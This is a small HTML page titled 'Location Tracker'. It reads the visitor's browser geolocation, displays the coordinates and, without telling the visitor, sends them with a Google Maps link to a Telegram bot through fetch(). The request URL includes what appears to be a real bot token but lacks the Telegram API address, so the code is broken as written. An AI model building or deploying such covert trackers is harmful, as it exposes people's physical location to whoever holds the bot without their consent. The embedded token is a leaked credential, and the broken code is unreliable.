<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Location Tracker</title>
</head>
<body>
<h1>Location Tracker</h1>
<p id="location"></p>

<script>
navigator.geolocation.getCurrentPosition(function(position) {
var latitude = position.coords.latitude;
var longitude = position.coords.longitude;
var location = "Latitude: " + latitude + "<br>Longitude: " + longitude;
document.getElementById("location").innerHTML = location;

// Convert to Google Maps link
var googleMapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;

// Send location data to Telegram bot
var url = "6673926198:AAFfUhgHc0pLNMp2yho5U-TPBAQ3xR9ta1I" + encodeURIComponent(location + "\n\nGoogle Maps link: " + googleMapsLink);
fetch(url);
});
</script>
</body>
</html>
